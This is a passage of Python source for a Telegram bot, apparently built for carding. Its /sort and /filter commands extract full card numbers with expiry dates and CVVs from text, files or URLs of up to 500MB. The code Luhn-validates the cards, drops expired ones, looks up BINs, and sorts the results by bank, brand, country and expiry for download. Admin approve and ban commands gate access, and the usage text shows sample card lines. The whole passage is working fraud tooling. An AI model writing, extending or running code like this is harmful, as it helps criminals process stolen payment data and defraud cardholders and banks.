                    await processing_msg.edit_text("❌ File is empty or could not be read.")
                    return
                    
                await processing_msg.edit_text(f"🔍 Processing {file_size_mb:.1f}MB...")
            except Exception as e:
                error_msg = str(e)
                if "too big" in error_msg.lower():
                    await processing_msg.edit_text(
                        "⚠️ File too large for Telegram Bot API.\n\n"
                        "💡 Set API_ID & API_HASH for large file support,\n"
                        "or use `/sort <URL>` with a file host.",
                        parse_mode="Markdown"
                    )
                else:
                    await processing_msg.edit_text(f"❌ Error: {error_msg[:100]}")
                return
        else:
            # Get text from replied message
            data_text = replied_msg.text or replied_msg.caption or ""
    else:
        # Get text from command arguments
        args_text = " ".join(context.args) if context.args else ""
        
        # Check if argument is a URL for large file download
        if args_text and is_valid_file_url(args_text.strip()):
            url = args_text.strip()
            processing_msg = await update.message.reply_text(
                f"🌐 Downloading from URL...\n`{url[:60]}...`" if len(url) > 60 else f"🌐 Downloading from URL...\n`{url}`",
                parse_mode="Markdown",
                reply_to_message_id=update.message.message_id
            )
            
            async def update_progress(percent, mb_downloaded):
                try:
                    await processing_msg.edit_text(
                        f"🌐 Downloading... {percent:.0f}%\n"
                        f"📥 {mb_downloaded:.1f}MB downloaded"
                    )
                except:
                    pass
            
            data_text, file_size_mb, error = await download_large_file_from_url(url, update_progress)
            
            if error:
                await processing_msg.edit_text(f"❌ Download failed: {error}")
                return
            
            if not data_text or not data_text.strip():
                await processing_msg.edit_text("❌ Downloaded file is empty or could not be read.")
                return
            
            await processing_msg.edit_text(f"🔍 Processing {file_size_mb:.1f}MB from URL...")
        else:
            data_text = args_text
    
    if not data_text or not data_text.strip():
        usage_text = (
            "📝 *Usage:*\n"
            "• `/sort <messy_data>` - Sort cards from text\n"
            "• `/sort <URL>` - Sort from URL (up to 500MB!) 🆕\n"
            "• Reply to a message with `/sort` - Extract from text\n"
            "• Reply to a .txt/.csv/.json file with `/sort` - Extract from file\n\n"
            "🌐 *Large Files (100-500MB):*\n"
            "Upload to transfer.sh, file.io, catbox.moe, pastebin, dropbox, etc.\n"
            "Then use: `/sort <direct_download_URL>`\n\n"
            "📁 *Telegram file limit:* 20MB\n"
            "⚡ *Processing speed:* Millions of cards\n"
            "📊 *Output format:* CC|MM|YY|CVV\n\n"
            "*Example:*\n"
            "`/sort 4403932640339759 03/27 401\n"
            "5583410027167381 05/30 896`"
        )
        await update.message.reply_text(usage_text, parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return
    
    # Start processing
    start_time_processing = time.time()
    status_msg = await update.message.reply_text("🔄 Processing data... This may take a moment for large files.", reply_to_message_id=update.message.message_id)
    
    try:
        # Extract and clean cards
        valid_cards, duplicates, expired, junk, total_raw = extract_and_clean_cards_sort(data_text)
        total_found = len(valid_cards)
        
        processing_time = time.time() - start_time_processing
        
        # Prepare statistics
        stats = (
            "📊 Sorting Results\n\n"
            f"📄 Total Raw Matches: {total_raw:,}\n"
            f"✅ Valid Cards Found: {total_found:,}\n"
            f"🗑️ Junk Removed: {junk:,}\n"
            f"♻️ Duplicates Removed: {duplicates:,}\n"
            f"⏰ Expired Removed: {expired:,}\n"
            f"⏱️ Processing Time: {processing_time:.2f}s\n\n"
        )
        
        if total_found == 0:
            await status_msg.edit_text(stats + "❌ No valid cards found in the provided data.")
            return
        
        # Store results in context for callback
        unique_id = f"s_{uid}_{int(time.time()) % 10000}"
        context.user_data[unique_id] = {
            'stats': stats,
            'cards': valid_cards,
            'total': total_found,
            'user_id': uid,
            'username': username,
            'timestamp': time.time()
        }
        
        # Clean old results (older than 1 hour)
        for key in list(context.user_data.keys()):
            if key.startswith("s_") or key.startswith("c_"):
                result_data = context.user_data[key]
                if time.time() - result_data.get('timestamp', 0) > 3600:
                    del context.user_data[key]
        
        # Decide output method
        if total_found <= 15:
            # Send in message for small results
            cards_text = "\n".join(valid_cards)
            if len(cards_text) <= 1800:  # Leave room for stats
                full_text = stats + "```\n" + cards_text + "\n```"
                await status_msg.edit_text(full_text, parse_mode="Markdown")
            else:
                # Too large for single message, send as file
                await send_sort_results_file(uid, unique_id, context, status_msg, update.message.chat.id)
        else:
            # For more than 15 cards, offer choice or auto-file
            keyboard = [
                [
                    InlineKeyboardButton("📄 Send as TXT File", callback_data=f"s_file:{unique_id}"),
                    InlineKeyboardButton("📝 Show in Message", callback_data=f"s_show:{unique_id}")
                ],
                [
                    InlineKeyboardButton("🗑️ Clear Session", callback_data=f"s_clr:{unique_id}")
                ]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await status_msg.edit_text(
                stats + f"📋 Found **{total_found:,}** cards. How would you like to receive the results?",
                reply_markup=reply_markup,
                parse_mode="Markdown"
            )
    
    except Exception as e:
        error_trace = traceback.format_exc()
        print(f"Sort error: {error_trace}")
        error_msg = f"❌ Error processing data: {str(e)[:100]}"
        await status_msg.edit_text(error_msg)
        
        # Send full error to admin
        if uid != BOT_ADMIN_ID:
            try:
                await context.bot.send_message(
                    BOT_ADMIN_ID,
                    f"❌ Sort error from user {uid}:\n{error_trace[:1000]}"
                )
            except:
                pass

async def send_sort_results_file(user_id, unique_id, context, original_message, chat_id):
    """Send sorted results as a text file (CLEAN FORMAT - ONLY CARDS) - supports large files via Pyrogram"""
    if unique_id not in context.user_data:
        await original_message.edit_text("❌ Results expired. Please run /sort again.")
        return
    
    results = context.user_data[unique_id]
    
    # Check authorization
    if results['user_id'] != user_id and not is_admin(user_id):
        await original_message.edit_text("❌ You are not authorized to view these results.")
        return
    
    cards = results['cards']
    total = results['total']
    
    # Create file content with ONLY CARDS (no extra text)
    file_content = "\n".join(cards)
    file_bytes = file_content.encode('utf-8')
    file_size_mb = len(file_bytes) / (1024 * 1024)
    
    filename = f"sorted_cards_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    caption = f"📁 Sorted Cards ({total:,} cards)\n👤 Processed by: {results['username']}"
    
    # Send as file - use smart sender for large files
    try:
        if file_size_mb > 45:
            await original_message.edit_text(f"📤 Uploading large file ({file_size_mb:.1f}MB)...")
        
        success = await send_large_document(
            bot=context.bot,
            chat_id=chat_id,
            content=file_bytes,
            filename=filename,
            caption=caption
        )
        
        if success:
            await original_message.edit_text(f"✅ Sent as file with {total:,} cards ({file_size_mb:.1f}MB).")
        else:
            # File too large and Pyrogram failed
            await original_message.edit_text(
                f"⚠️ File too large ({file_size_mb:.1f}MB) for direct upload.\n\n"
                "💡 Try splitting the data into smaller chunks, or ensure API_ID and API_HASH are set for large file support."
            )
    except Exception as e:
        print(f"Error sending file: {e}")
        await original_message.edit_text(f"❌ Error sending file: {str(e)[:100]}")

async def sort_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle sort command callbacks"""
    query = update.callback_query
    try:
        await query.answer()
    except Exception:
        pass  # Ignore timeout errors
    
    user_id = query.from_user.id
    data = query.data
    
    if not data:
        return
    
    if data.startswith("s_clr:"):
        # Clear session
        unique_id = data.split(":")[1]
        if unique_id in context.user_data:
            del context.user_data[unique_id]
        await query.edit_message_text("🗑️ Session cleared. Run /sort again to process new data.")
        return
    
    elif data.startswith("s_file:"):
        # Send as file
        unique_id = data.split(":")[1]
        await send_sort_results_file(user_id, unique_id, context, query.message, query.message.chat.id)
        return
    
    elif data.startswith("s_show:"):
        # Show in message
        unique_id = data.split(":")[1]
        
        if unique_id not in context.user_data:
            await query.edit_message_text("❌ Results expired. Please run /sort again.")
            return
        
        results = context.user_data[unique_id]
        
        # Check authorization
        if results['user_id'] != user_id and not is_admin(user_id):
            await query.edit_message_text("❌ You are not authorized to view these results.")
            return
        
        stats = results['stats']
        cards = results['cards']
        total = results['total']
        
        # Truncate if too large
        max_chars = 3500  # Leave room for stats
        cards_text = "\n".join(cards)
        
        if len(cards_text) > max_chars:
            # Count lines truncated
            lines = cards_text.split('\n')
            if len(lines) > 20:
                cards_display = '\n'.join(lines[:20])
                cards_display += f"\n\n... and {len(lines) - 20} more cards (view full list in file)"
            else:
                cards_display = cards_text[:max_chars] + "..."
        else:
            cards_display = cards_text
        
        # Escape Markdown special characters in cards
        cards_display_escaped = cards_display.replace("_", "\\_").replace("*", "\\*").replace("`", "\\`")
        
        full_text = stats + "```\n" + cards_display_escaped + "\n```"
        
        # Create new keyboard with clear option
        keyboard = [
            [
                InlineKeyboardButton("📄 Get Full TXT File", callback_data=f"s_file:{unique_id}"),
                InlineKeyboardButton("🗑️ Clear Session", callback_data=f"s_clr:{unique_id}")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        try:
            await query.edit_message_text(full_text, parse_mode="Markdown", reply_markup=reply_markup)
        except Exception as e:
            # If still too large, send as file instead
            print(f"Message too large, falling back to file: {e}")
            await send_sort_results_file(user_id, unique_id, context, query.message, query.message.chat.id)

# ==== 13. Updated Admin Commands (per-command approve) ====
def _normalize_cmd_arg(arg: str) -> Optional[str]:
    a = (arg or "").lower().strip()
    if a in ("all", *CMD_KEYS):
        return a
    return None

async def approve(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 2:
        # FIXED: Properly escape backticks in Markdown
        await update.message.reply_text(
            "⚠️ Usage: `/approve <user_id> <cmd|all>`\nExample: `/approve 123456 st`", 
            parse_mode="Markdown", 
            reply_to_message_id=update.message.message_id
        )
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    cmd = _normalize_cmd_arg(context.args[1])
    if cmd is None:
        await update.message.reply_text(
            f"❌ Unknown command type. Use one of: `{', '.join(CMD_KEYS)}` or `all`", 
            parse_mode="Markdown", 
            reply_to_message_id=update.message.message_id
        )
        return

    if cmd == "all":
        approved_all.add(uid)
        approved_users.add(uid)
    else:
        approved_cmds[cmd].add(uid)

    banned_users.discard(uid)
    save_users()
    
    await update.message.reply_text(f"✅ Approved `{uid}` for `{cmd}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def unapprove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "⚠️ Usage: `/unapprove <user_id> <cmd|all>`", 
            parse_mode="Markdown", 
            reply_to_message_id=update.message.message_id
        )
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    cmd = _normalize_cmd_arg(context.args[1])
    if cmd is None:
        await update.message.reply_text(
            f"❌ Unknown command type. Use one of: `{', '.join(CMD_KEYS)}` or `all`", 
            parse_mode="Markdown", 
            reply_to_message_id=update.message.message_id
        )
        return

    if cmd == "all":
        approved_all.discard(uid)
        approved_users.discard(uid)
        for k in CMD_KEYS:
            approved_cmds[k].discard(uid)
    else:
        approved_cmds[cmd].discard(uid)

    save_users()
    
    await update.message.reply_text(f"🗑️ Revoked `{cmd}` from `{uid}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/remove <user_id>`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    approved_all.discard(uid)
    approved_users.discard(uid)
    for k in CMD_KEYS:
        approved_cmds[k].discard(uid)
    banned_users.discard(uid)
    save_users()
    
    await update.message.reply_text(f"🗑️ Removed user `{uid}` from all lists", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/ban <user_id>`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    banned_users.add(uid)
    approved_all.discard(uid)
    approved_users.discard(uid)
    for k in CMD_KEYS:
        approved_cmds[k].discard(uid)
    save_users()
    
    await update.message.reply_text(f"🚫 Banned user `{uid}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

async def unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("⚠️ Usage: `/unban <user_id>`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)
        return
    try:
        uid = int(context.args[0])
    except:
        await update.message.reply_text("❌ Invalid user ID.", reply_to_message_id=update.message.message_id)
        return

    banned_users.discard(uid)
    save_users()
    
    await update.message.reply_text(f"✅ Unbanned user `{uid}`", parse_mode="Markdown", reply_to_message_id=update.message.message_id)

# ==== 13.5 /filter Command - Fast Card Filter & Organizer ====
_filter_sessions = {}  # Store filter sessions

def _escape_md(text: str) -> str:
    """Escape Markdown special characters"""
    if not text:
        return ""
    # Escape: _ * [ ] ( ) ~ ` > # + - = | { } . !
    chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
    for c in chars:
        text = text.replace(c, f'\\{c}')
    return text

def _parse_cards_fast(text: str) -> list:
    """Fast card parsing with regex - returns list of card dicts"""
    if not text:
        return []
    
    cards = []
    seen = set()
    
    # Normalize separators
    text = text.replace('\r', '\n')
    
    # Pattern for card: 13-19 digits, then separator, MM, separator, YY/YYYY, separator, CVV
    pattern = r'(\d{13,19})[|\s/\\:;,._-]+(\d{1,2})[|\s/\\:;,._-]+(\d{2,4})[|\s/\\:;,._-]+(\d{3,4})'
    
    for match in re.finditer(pattern, text):
        cc, mm, yy, cvv = match.groups()
        
        # Normalize
        mm = mm.zfill(2)
        yy = yy[-2:] if len(yy) == 4 else yy.zfill(2)
        
        # Validate
        if not (1 <= int(mm) <= 12):
            continue
        if len(cvv) < 3:
            continue
        
        # Create unique key
        key = f"{cc}|{mm}|{yy}|{cvv}"
        if key in seen:
            continue
        seen.add(key)
        
        # Check if expired
        try:
            year = 2000 + int(yy)
            month = int(mm)
            now = datetime.now()
            if year < now.year or (year == now.year and month < now.month):
                continue  # Skip expired
        except:
            continue
        
        # Luhn check
        digits = [int(d) for d in cc]
        checksum = 0
        for i, d in enumerate(reversed(digits)):
            if i % 2 == 1:
                d *= 2
                if d > 9:
                    d -= 9
            checksum += d
        if checksum % 10 != 0:
            continue
        
        cards.append({
            'cc': cc,
            'mm': mm,
            'yy': yy,
            'cvv': cvv,
            'bin': cc[:6],
            'formatted': key
        })
    
    return cards

def _organize_cards(cards: list) -> dict:
    """Organize cards by BIN, month, year - FAST version (no API calls)"""
    result = {
        'by_bin': {},
        'by_month': {},
        'by_year': {},
        'by_brand': {},
        'by_type': {},
        'by_level': {},
        'by_country': {},
        'by_year_month': {},
        'all': cards,
        '_bin_info_loaded': False  # Flag for lazy loading
    }
    
    # Single pass: organize by basic fields only (FAST)
    for card in cards:
        bin_num = card['bin']
        mm = card['mm']
        yy = card['yy']
        
        # By BIN
        if bin_num not in result['by_bin']:
            result['by_bin'][bin_num] = []
        result['by_bin'][bin_num].append(card)
        
        # By month
        if mm not in result['by_month']:
            result['by_month'][mm] = []
        result['by_month'][mm].append(card)
        
        # By year
        if yy not in result['by_year']:
            result['by_year'][yy] = []
        result['by_year'][yy].append(card)
        
        # By year+month
        ym_key = f"{yy}_{mm}"
        if ym_key not in result['by_year_month']:
            result['by_year_month'][ym_key] = []
        result['by_year_month'][ym_key].append(card)
    
    return result

def _load_bin_details_lazy(organized: dict) -> None:
    """Load BIN details lazily when needed (for brand/type/level/country)"""
    if organized.get('_bin_info_loaded'):
        return
    
    # Sort BINs by card count and limit to top 100 for speed
    sorted_bins = sorted(organized['by_bin'].items(), key=lambda x: -len(x[1]))[:100]
    
    for bin_num, cards_list in sorted_bins:
        try:
            # Use cached lookup (fast)
            info_str, details = get_bin_info(bin_num)
            if not details:
                continue
            
            # By Brand
            brand = (details.get('brand') or '').upper()
            if brand and brand != 'UNKNOWN':
                if brand not in organized['by_brand']:
                    organized['by_brand'][brand] = []
                organized['by_brand'][brand].extend(cards_list)
            
            # By Type
            card_type = (details.get('type') or '').upper()
            if card_type and card_type != 'UNKNOWN':
                if card_type not in organized['by_type']:
                    organized['by_type'][card_type] = []
                organized['by_type'][card_type].extend(cards_list)
            
            # By Level
            level = (details.get('level') or '').upper()
            if level:
                if level not in organized['by_level']:
                    organized['by_level'][level] = []
                organized['by_level'][level].extend(cards_list)
            
            # By Country
            country = details.get('country') or details.get('country_name') or ''
            country_flag = details.get('country_flag') or ''
            if country:
                country_key = f"{country_flag} {country}" if country_flag else country
                if country_key not in organized['by_country']:
                    organized['by_country'][country_key] = []
                organized['by_country'][country_key].extend(cards_list)
        except:
            continue
    
    organized['_bin_info_loaded'] = True

async def filter_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Fast card filter command - extracts, validates, and organizes cards"""
    uid = update.effective_user.id
    uname = update.effective_user.username or update.effective_user.first_name or "User"
    
    if not is_approved(uid, "filter"):
        await update.message.reply_text("⛔ You are not approved to use /filter", reply_to_message_id=update.message.message_id)
        return
    
    if not is_cmd_enabled("filter"):
        await update.message.reply_text("⚠️ This command is currently disabled by admin.", reply_to_message_id=update.message.message_id)
        return
    
    # Get input data
    data_text = ""
    file_size_mb = 0
    msg = None
    
    if update.message.reply_to_message:
        replied = update.message.reply_to_message
        
        # Check for file
        if replied.document:
            file_size = replied.document.file_size
            file_size_mb = file_size / (1024 * 1024)
            
            msg = await update.message.reply_text(
                f"📥 Downloading ({file_size_mb:.1f}MB)...", 
                reply_to_message_id=update.message.message_id
            )
            try:
                # For files > 20MB, use Pyrogram to download
                if file_size > 20 * 1024 * 1024:
                    if _pyrogram_available and _get_pyrogram_config():
                        await msg.edit_text(
                            f"📥 Downloading large file ({file_size_mb:.1f}MB) via MTProto...\n\n"
                            f"<i>This may take a moment...</i>",
                            parse_mode="HTML"
                        )
                        file_bytes = await download_large_file_pyrogram(
                            replied.document.file_id,
                            file_size
                        )
                        if file_bytes:
                            for encoding in ['utf-8', 'latin-1', 'cp1252', 'iso-8859-1']:
                                try:
                                    data_text = file_bytes.decode(encoding)
                                    break
                                except UnicodeDecodeError:
                                    continue
                            else:
                                data_text = file_bytes.decode('utf-8', errors='ignore')
                            
                            if not data_text or not data_text.strip():
                                await msg.edit_text("❌ File is empty or could not be read.")
                                return
                            await msg.edit_text(f"🔍 Processing {file_size_mb:.1f}MB...")
                        else:
                            await msg.edit_text(
                                f"❌ Failed to download large file.\n\n"
                                "🌐 *Alternative - use URL:*\n"
                                "1. Upload to: transfer.sh, file.io, catbox.moe\n"
                                "2. Use: `/filter <URL>`",
                                parse_mode="Markdown"
                            )
                            return
                    else:
                        await msg.edit_text(
                            f"⚠️ File too large: {file_size_mb:.1f}MB\n\n"
                            "💡 *Large file support requires API_ID & API_HASH*\n\n"
                            "🌐 *Or use URL method:*\n"
                            "1. Upload to: transfer.sh, file.io, catbox.moe\n"
                            "2. Use: `/filter <URL>`",
                            parse_mode="Markdown"
                        )
                        return
                else:
                    file = await context.bot.get_file(replied.document.file_id)
                    file_bytes = await file.download_as_bytearray()
                    data_text = file_bytes.decode('utf-8', errors='ignore')
                    
                    if not data_text or not data_text.strip():
                        await msg.edit_text("❌ File is empty or could not be read.")
                        return
                    await _safe_edit_text(msg, f"🔍 Processing {file_size_mb:.1f}MB...")
            except Exception as e:
                error_msg = str(e)
                if "too big" in error_msg.lower():
                    await msg.edit_text(
                        "⚠️ File too large for Telegram Bot API.\n\n"
                        "💡 Set API_ID & API_HASH for large file support,\n"
                        "or use `/filter <URL>` with a file host.",
                        parse_mode="Markdown"
                    )
                else:
                    await msg.edit_text(f"❌ Error: {error_msg[:50]}")
                return
        else:
            data_text = replied.text or replied.caption or ""
    else:
        args_text = " ".join(context.args) if context.args else ""
        
        # Check if argument is a URL for large file download
        if args_text and is_valid_file_url(args_text.strip()):
            url = args_text.strip()
            msg = await update.message.reply_text(
                f"🌐 Downloading from URL...\n`{url[:60]}...`" if len(url) > 60 else f"🌐 Downloading from URL...\n`{url}`",
                parse_mode="Markdown",
                reply_to_message_id=update.message.message_id
            )
            
            async def update_progress(percent, mb_downloaded):
                try:
                    await msg.edit_text(
                        f"🌐 Downloading... {percent:.0f}%\n"
                        f"📥 {mb_downloaded:.1f}MB downloaded"
                    )
                except:
                    pass
            
            data_text, file_size_mb, error = await download_large_file_from_url(url, update_progress)
            
            if error:
                await msg.edit_text(f"❌ Download failed: {error}")
                return
            
            if not data_text or not data_text.strip():
                await msg.edit_text("❌ Downloaded file is empty or could not be read.")
                return
            
            await msg.edit_text(f"🔍 Processing {file_size_mb:.1f}MB from URL...")
        else:
            data_text = args_text
    
    if not data_text.strip():
        await update.message.reply_text(
            "🔍 *Fast Card Filter*\n\n"
            "*Usage:*\n"
            "• `/filter <data>` - Filter cards from text\n"
            "• `/filter <URL>` - Filter from URL (up to 500MB!) 🆕\n"
            "• Reply to message with `/filter`\n"
            "• Reply to file with `/filter`\n\n"
            "🌐 *Large Files (100-500MB):*\n"
            "Upload to transfer.sh, file.io, catbox.moe, pastebin, dropbox, etc.\n"
            "Then use: `/filter <direct_download_URL>`\n\n"
            "*Features:*\n"
            "• ⚡ Ultra-fast streaming processing\n"
            "• ✅ Luhn validation\n"
            "• 📅 Expiry check\n"
            "• 🏦 BIN lookup\n"
            "• 📊 Organize by BIN/Month/Year\n\n"
            "*Telegram file limit:* 20MB | *URL limit:* 500MB",
            parse_mode="Markdown",
            reply_to_message_id=update.message.message_id
        )
        return
    
    # Process
    start = time.time()
    msg = await update.message.reply_text("⚡ Filtering cards...", reply_to_message_id=update.message.message_id)
    
    try:
        # Parse cards (fast)
        cards = _parse_cards_fast(data_text)
        
        if not cards:
            await msg.edit_text("❌ No valid cards found.\n\nMake sure format is: `CC|MM|YY|CVV`", parse_mode="Markdown")
            return
        
        # Organize
        organized = _organize_cards(cards)
        
        # Create session
        session_id = f"f_{uid}_{int(time.time())}"
        _filter_sessions[session_id] = {
            'data': organized,
            'user': uname,
            'count': len(cards),
            'created': time.time()
        }
        
        # Clean old sessions (older than 30 min)
        now = time.time()
        for sid in list(_filter_sessions.keys()):
            if now - _filter_sessions[sid].get('created', 0) > 1800:
                del _filter_sessions[sid]
        
        duration = round(time.time() - start, 2)
        
        # Build stats (fast - no BIN lookups yet)
        bins_count = len(organized['by_bin'])
        years = sorted(organized['by_year'].keys())
        months_count = len(organized['by_month'])
        
        # Create buttons - simple layout
        buttons = [
            [InlineKeyboardButton("📥 Download All", callback_data=f"f_dl:{session_id}")],
            [
                InlineKeyboardButton(f"🏦 BIN ({bins_count})", callback_data=f"f_bin:{session_id}"),
                InlineKeyboardButton("💳 Brand", callback_data=f"f_brand:{session_id}")
            ],
            [
                InlineKeyboardButton("🔖 Type", callback_data=f"f_type:{session_id}"),
                InlineKeyboardButton("⭐ Level", callback_data=f"f_level:{session_id}")
            ],
            [
                InlineKeyboardButton("🌍 Country", callback_data=f"f_country:{session_id}"),
                InlineKeyboardButton("📅 Year+Month", callback_data=f"f_ym:{session_id}")
            ],
            [
                InlineKeyboardButton(f"📅 Month ({months_count})", callback_data=f"f_month:{session_id}"),
                InlineKeyboardButton(f"📆 Year ({len(years)})", callback_data=f"f_year:{session_id}")
            ],
            [
                InlineKeyboardButton("🔍 Search", callback_data=f"f_search:{session_id}"),
                InlineKeyboardButton("🗑️ Clear", callback_data=f"f_clear:{session_id}")
            ]
        ]
        
        await msg.edit_text(
            f"✅ *Filter Complete*\n\n"
            f"📊 Cards: `{len(cards):,}`\n"
            f"🏦 BINs: `{bins_count}`\n"
            f"📆 Years: `{', '.join(years)}`\n\n"
            f"⏱ `{duration}s` 👤 {_escape_md(uname)}",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)[:100]}")

async def filter_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle filter command callbacks"""
    query = update.callback_query
    try:
        await query.answer()
    except:
        pass
    
    data = query.data
    if not data or not data.startswith("f_"):
        return
    
    parts = data.split(":")
    action = parts[0]
    session_id = parts[1] if len(parts) > 1 else None
    extra = parts[2] if len(parts) > 2 else None
    
    if not session_id or session_id not in _filter_sessions:
        await query.edit_message_text("❌ Session expired. Run /filter again.")
        return
    
    session = _filter_sessions[session_id]
    organized = session['data']
    
    # Back button
    def back_btn():
        return InlineKeyboardButton("⬅️ Back", callback_data=f"f_back:{session_id}")
    
    # Download all - use smart sender for large files
    if action == "f_dl":
        cards = organized['all']
        content = "\n".join([c['formatted'] for c in cards])
        file_bytes = content.encode('utf-8')
        file_size_mb = len(file_bytes) / (1024 * 1024)
        filename = f"filtered_{len(cards)}_{int(time.time())}.txt"
        caption = f"📥 {len(cards):,} cards ({file_size_mb:.1f}MB)\n👤 {session['user']}"
        
        success = await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=filename,
            caption=caption
        )
        
        if not success:
            await query.answer(f"⚠️ File too large ({file_size_mb:.1f}MB). Set API_ID/API_HASH for large files.", show_alert=True)
        return
    
    # By BIN list
    elif action == "f_bin":
        bins = sorted(organized['by_bin'].items(), key=lambda x: -len(x[1]))[:20]
        
        buttons = []
        for bin_num, cards in bins:
            info_str, details = get_bin_info(bin_num)
            flag = (details or {}).get('country_flag', '')
            brand = (details or {}).get('brand', '')[:4]
            buttons.append([InlineKeyboardButton(
                f"{flag} {bin_num} | {brand} | {len(cards)}",
                callback_data=f"f_getbin:{session_id}:{bin_num}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            f"🏦 *Top BINs* (showing 20)\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific BIN - use smart sender for large files
    elif action == "f_getbin":
        bin_num = extra
        cards = organized['by_bin'].get(bin_num, [])
        
        if not cards:
            await query.answer("No cards for this BIN")
            return
        
        content = "\n".join([c['formatted'] for c in cards])
        file_bytes = content.encode('utf-8')
        info_str, details = get_bin_info(bin_num)
        flag = (details or {}).get('country_flag', '')
        
        await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=f"bin_{bin_num}_{len(cards)}.txt",
            caption=f"🏦 BIN: {bin_num} {flag}\n📊 Cards: {len(cards)}\n💳 {info_str}"
        )
        return
    
    # By Month
    elif action == "f_month":
        months = sorted(organized['by_month'].keys())
        month_names = ['', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        
        buttons = []
        row = []
        for mm in months:
            count = len(organized['by_month'][mm])
            name = month_names[int(mm)] if int(mm) <= 12 else mm
            row.append(InlineKeyboardButton(f"{name} ({count})", callback_data=f"f_getmonth:{session_id}:{mm}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "📅 *By Expiry Month*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific month
    elif action == "f_getmonth":
        mm = extra
        cards = organized['by_month'].get(mm, [])
        
        if not cards:
            await query.answer("No cards for this month")
            return
        
        content = "\n".join([c['formatted'] for c in cards])
        file_bytes = content.encode('utf-8')
        month_names = ['', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        name = month_names[int(mm)] if int(mm) <= 12 else mm
        
        await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=f"month_{mm}_{len(cards)}.txt",
            caption=f"📅 Month: {name}\n📊 Cards: {len(cards)}"
        )
        return
    
    # By Year
    elif action == "f_year":
        years = sorted(organized['by_year'].keys())
        
        buttons = []
        row = []
        for yy in years:
            count = len(organized['by_year'][yy])
            row.append(InlineKeyboardButton(f"20{yy} ({count})", callback_data=f"f_getyear:{session_id}:{yy}"))
            if len(row) == 3:
                buttons.append(row)
                row = []
        if row:
            buttons.append(row)
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "📆 *By Expiry Year*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific year - use smart sender for large files
    elif action == "f_getyear":
        yy = extra
        cards = organized['by_year'].get(yy, [])
        
        if not cards:
            await query.answer("No cards for this year")
            return
        
        content = "\n".join([c['formatted'] for c in cards])
        file_bytes = content.encode('utf-8')
        
        await send_large_document(
            bot=query.message.get_bot(),
            chat_id=query.message.chat.id,
            content=file_bytes,
            filename=f"year_20{yy}_{len(cards)}.txt",
            caption=f"📆 Year: 20{yy}\n📊 Cards: {len(cards)}"
        )
        return
    
    # By Brand (lazy load BIN details)
    elif action == "f_brand":
        # Load BIN details if not already loaded
        _load_bin_details_lazy(organized)
        
        brands = sorted(organized['by_brand'].items(), key=lambda x: -len(x[1]))
        
        if not brands:
            await query.answer("No brand data available")
            return
        
        buttons = []
        for brand, cards_list in brands[:15]:
            buttons.append([InlineKeyboardButton(
                f"💳 {brand} ({len(cards_list)})",
                callback_data=f"f_getbrand:{session_id}:{brand[:20]}"
            )])
        
        buttons.append([back_btn()])
        
        await query.edit_message_text(
            "💳 *By Brand*\n\nTap to download:",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup(buttons)
        )
        return
    
    # Get specific brand - use smart sender for large files
    elif action == "f_getbrand":
        brand = extra
